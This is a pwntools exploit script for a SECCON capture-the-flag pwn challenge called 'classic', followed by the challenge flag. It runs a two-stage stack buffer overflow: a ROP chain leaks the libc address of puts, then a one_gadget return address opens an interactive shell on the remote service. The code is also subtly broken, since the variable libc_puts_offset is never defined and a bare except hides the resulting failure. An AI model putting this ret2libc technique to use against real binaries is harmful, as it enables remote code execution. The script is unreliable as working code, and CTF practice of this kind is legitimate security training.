from pwn import *

### DEBUGGING ###
DEBUG = False
context.log_level = 'debug'

if DEBUG:
    r = process('./classic_aa9e979fd5c597526ef30c003bffee474b314e22', env = {'LD_PRELOAD': './libc-2.23.so_56d992a0342a67a887b8dcaae381d2cc51205253'})
    #gdb.attach(r, 'b *0x4006e6')
    timeout = 0.1

else :
    r = remote('classic.pwn.seccon.jp', 17354)
    timeout = 0.3

def rr(s):
    sleep(timeout)
    return r.recvuntil(s)

def ss(s):
    sleep(timeout)
    return r.sendline(s)

### ADDRESS ###
start = 0x400580
puts_plt = 0x400526
puts_got = 0x601018

one_gadgets_list = [0x45216, 0x4526a, 0xf02a4, 0xf1147]

# 0x0000000000400753 : pop rdi ; ret
pop_rdi = 0x400753

### EXPLOIT ###
def main():

    # Frist stage : Leak libc_base
    payload = 'a' * 0x48
    payload += p64(pop_rdi)
    payload += p64(puts_got)
    payload += p64(puts_plt)
    payload += p64(start)

    rr('>> ')
    ss(payload)
    rr('!\n')

    libc_puts = u64((rr('\n')[:-1]).ljust(8, '\x00'))
    log.info('leak libc_puts addr 0x%x' % libc_puts)
    libc_base = libc_puts - libc_puts_offset
    log.info('leak libc_base addr 0x%x' % libc_base)

    sleep(1)

    # Second stage : Using one_gadget to exploit
    payload2 = 'a' * 0x48
    payload2 += p64(libc_base + one_gadgets_list[0])

    rr('>> ')
    ss(payload2)
    rr('!\n')

    r.interactive()

if __name__ == '__main__':
    try:
        main()
    except:
        log.info('exception occur')

# SECCON{w4rm1ng_up_by_7r4d1710n4l_73chn1qu3}
